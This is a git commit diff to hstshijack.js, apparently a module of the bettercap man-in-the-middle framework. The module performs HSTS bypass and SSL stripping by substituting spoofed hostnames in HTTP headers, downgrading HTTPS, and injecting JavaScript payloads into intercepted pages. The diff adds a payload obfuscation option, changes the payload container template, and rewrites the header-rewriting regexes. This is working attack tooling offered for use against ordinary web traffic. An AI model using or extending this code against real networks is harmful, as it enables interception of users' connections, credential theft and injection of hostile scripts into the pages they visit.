35298cd26ff67873c27a6206c1e23c9be352cbf1
yungtravla <lilprismontour@gmail.com>
2018-09-14 22:22:44 +1000

    merge with hstshijack-updates branch

--- hstshijack/hstshijack.js
+++ hstshijack/hstshijack.js
@@ -6,15 +6,15 @@ var ssl_log = [],
 
 var payload,
     payload_path,
-    payload_container = "\
-    	if (!self.{{session_id}}) {\
-    		var {{session_id}} = function() {\
-    				{{variables}}\
-    				{{payload}}\
-    				{{custom_payload}}\
-    		}\
-    		{{session_id}}();\
-    	}\
+    payload_container = "\n\
+    	if (!self.{{session_id}}) {\n\
+    		var {{session_id}} = function() {\n\
+    				{{variables}}\n\
+    				{{payload}}\n\
+    				{{custom_payload}}\n\
+    		}\n\
+    		{{session_id}}();\n\
+    	}\n\
     "
 
 var ignore_hosts       = [],
@@ -128,6 +128,9 @@ function configure() {
 			log_fatal("(" + green + "hstshijack" + reset + ") Could not read a path in hstshijack.custompayloads (got " + custom_payload_path + ").")
 		}
 	}
+	if (obfuscation == "false") {
+		obfuscation = false
+	}
 
 	// Read & prepare core payload.
 	resetPayload()
@@ -160,6 +163,7 @@ function showModule() {
 	logStr += "    " + yellow + "       hstshijack.targets" + reset + " > " + ( env("hstshijack.targets") ? green + env("hstshijack.targets") : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "  hstshijack.replacements" + reset + " > " + ( env("hstshijack.replacements") ? green + env("hstshijack.replacements") : red + "undefined" ) + reset + "\n"
 	logStr += "    " + yellow + "  hstshijack.blockscripts" + reset + " > " + ( env("hstshijack.blockscripts") ? green + env("hstshijack.blockscripts") : red + "undefined" ) + reset + "\n"
+	logStr += "    " + yellow + "     hstshijack.obfuscate" + reset + " > " + ( obfuscation ? green + "true" : red + "false" ) + reset + "\n"
 	logStr += "    " + yellow + "hstshijack.custompayloads" + reset + " > "
 	if ( env("hstshijack.custompayloads") ) {
 			custom_payloads = env("hstshijack.custompayloads").replace(/\s/g, "").split(",")
@@ -327,12 +331,12 @@ function onRequest(req, res) {
 			// Patch spoofed hostnames.
 			for (var a = 0; a < target_hosts.length; a++) {
 				// Patch spoofed hostnames in headers.
-				regexp  = new RegExp( "(.*?)" + replacement_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "(.*?)", "ig" )
+				regexp = new RegExp( replacement_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
 				if ( req.Headers.match(regexp) ) {
 					matches = req.Headers.match(regexp)
 					for (var b = 0; b < matches.length; b++) {
 						original_host = target_hosts[a].replace("*", "")
-						replacement   = matches[b].replace(regexp, "$1" + original_host + "$2")
+						replacement   = matches[b].replace(regexp, original_host + "$1")
 						req.Headers   = req.Headers.replace(matches[b], replacement)
 					}
 					log_debug("(" + green + "hstshijack" + reset + ") Patched spoofed hostname(s) in request header(s).")
@@ -352,11 +356,11 @@ function onRequest(req, res) {
 
 			// Patch SSL in headers if we know host uses SSL.
 			for (var a = 0; a < ssl_log.length; a++) {
-				regexp      = new RegExp( "(.*?)http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "(.*?)", "ig" )
+				regexp = new RegExp( "http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^\.a-z]*)", "igm" )
 				if ( req.Headers.match(regexp) ) {
 					matches = req.Headers.match(regexp)
 					for (var b = 0; b < matches.length; b++) {
-						replacement = matches[b].replace(regexp, "$1" + "https://" + ssl_log[a] + "$2")
+						replacement = matches[b].replace(regexp, "https://" + ssl_log[a] + "$1")
 						req.Headers = req.Headers.replace(matches[b], replacement)
 						log_debug("(" + green + "hstshijack" + reset + ") Patched SSL in header(s) for " + ssl_log[a] + ".")
 					}
@@ -539,12 +543,12 @@ function onResponse(req, res) {
 
 		// Replace hosts in headers.
 		for (var a = 0; a < target_hosts.length; a++) {
-			regexp  = new RegExp( "(.*?)" + target_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "(.*?)", "ig" )
+			regexp  = new RegExp( target_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
 			if ( res.Headers.match(regexp) ) {
 				matches = res.Headers.match(regexp)
 				for (var b = 0; b < matches.length; b++) {
 					original_host = replacement_hosts[a].replace("*", "")
-					replacement   = matches[b].replace(regexp, "$1" + original_host + "$2")
+					replacement   = matches[b].replace(regexp, original_host + "$1")
 					res.Headers   = res.Headers.replace(matches[b], replacement)
 					log_debug("(" + green + "hstshijack" + reset + ") Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
 				}
